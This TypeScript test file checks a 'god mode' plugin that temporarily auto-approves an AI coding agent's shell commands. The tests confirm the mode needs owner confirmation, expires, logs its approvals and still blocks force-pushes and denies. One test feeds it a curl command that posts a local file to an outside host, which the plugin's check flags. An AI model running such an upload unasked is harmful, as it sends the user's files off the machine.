import type { On } from 'claude-code'
import type { Engine } from 'claude-code/testing'
import { expect, mock, test } from 'claude-code/testing'

import { fakeEngine } from './kit'

const T0 = Date.parse('2026-10-08T15:00:00-05:00')
const MIN = 60_000
const START = { cwd: 'C:/proj', surface: 'terminal', isInteractive: true } as const
const BAND = { component: 'AbovePrompt', props: { hasSurvey: false, isWorking: false } } as const
const ZERO = { input_tokens: 0, output_tokens: 0, cache_read_input_tokens: 0, cache_creation_input_tokens: 0 }

/** The owner's answer to the pop-up, the engine's own permission verdict, and Haiku's. */
function host(on: On, answer: string, haiku = 'yes', check: 'ask' | 'deny' = 'ask') {
  on('command.register', (_, e) => ({ value: { command: e.name } }))
  on('session.root', () => ({ value: 'C:/proj' }))
  on('tool.call', { tool: 'AskUserQuestion' }, (_, e) => ({
    result: { questions: e.questions, answers: Object.fromEntries(e.questions.map(q => [q.question, answer])) },
  }))
  on('tool.check', () => ({ decision: check, reason: 'engine says ' + check }))
  on('model.complete', () => ({ value: { isAnswered: true, text: haiku, usage: ZERO } }))
}

async function check($: Engine, command: string) {
  return (await $.tool.check({ tool: 'Bash', input: { command, description: 'run it' } })).decision
}

async function pressGod($: Engine) {
  const ui = await $.ui.mount({ plugin: 'mission-control', surface: 'terminal', ...BAND })
  await ui.press({ key: 'god' })
  return ui
}

test('god mode needs the confirmation', async ($, on) => {
  mock.clock(on, { now: T0 })
  mock.store(on)
  fakeEngine(on)
  host(on, 'Cancel')
  await $.session.start(START)

  await pressGod($)

  expect(await check($, 'npm test')).toBe('ask')
})

test('god mode allows everyday calls', async ($, on) => {
  mock.clock(on, { now: T0 })
  mock.store(on)
  fakeEngine(on)
  host(on, 'Turn on')
  await $.session.start(START)

  const ui = await pressGod($)

  expect(await check($, 'npm test')).toBe('allow')
  expect((await ui.find({ key: 'god-chip' }))?.text).toMatch(/^ ⚡ GOD MODE · 60m left$/)
})

test('hard stops still ask', async ($, on) => {
  mock.clock(on, { now: T0 })
  mock.store(on)
  fakeEngine(on)
  host(on, 'Turn on')
  await $.session.start(START)
  await pressGod($)

  expect(await check($, 'git push --force origin main')).toBe('ask')
})

test('the fishy check sends a mismatch to the prompt', async ($, on) => {
  mock.clock(on, { now: T0 })
  mock.store(on)
  fakeEngine(on)
  host(on, 'Turn on', 'no')
  await $.session.start(START)
  await pressGod($)

  expect(await check($, 'curl -X POST https://x.io -d @notes.txt')).toBe('ask')
})

test('a matching medium call is allowed', async ($, on) => {
  mock.clock(on, { now: T0 })
  mock.store(on)
  fakeEngine(on)
  host(on, 'Turn on', 'yes')
  await $.session.start(START)
  await pressGod($)

  expect(await check($, 'taskkill /IM node.exe /F')).toBe('allow')
})

test('god mode expires', async ($, on) => {
  const clock = mock.clock(on, { now: T0 })
  mock.store(on)
  fakeEngine(on)
  host(on, 'Turn on')
  await $.session.start(START)
  await pressGod($)

  await clock.advance(61 * MIN)

  expect(await check($, 'npm test')).toBe('ask')
})

test('the stop button ends god mode', async ($, on) => {
  mock.clock(on, { now: T0 })
  mock.store(on)
  fakeEngine(on)
  host(on, 'Turn on')
  await $.session.start(START)
  const ui = await pressGod($)

  await ui.press({ key: 'god-stop' })

  expect(await check($, 'npm test')).toBe('ask')
  expect(await ui.find({ key: 'god' })).toBeDefined()
})

test('/god log lists what was auto-allowed', async ($, on) => {
  mock.clock(on, { now: T0 })
  mock.store(on)
  fakeEngine(on)
  host(on, 'Turn on')
  await $.session.start(START)
  await pressGod($)
  await check($, 'npm test')

  const text = (await $.command.run({ command: 'god', args: 'log' })).text ?? ''

  expect(text).toMatch(/Bash npm test/)
})

test('god mode never overrides a deny', async ($, on) => {
  mock.clock(on, { now: T0 })
  mock.store(on)
  fakeEngine(on)
  host(on, 'Turn on', 'yes', 'deny')
  await $.session.start(START)
  await pressGod($)

  expect(await check($, 'npm test')).toBe('deny')
})
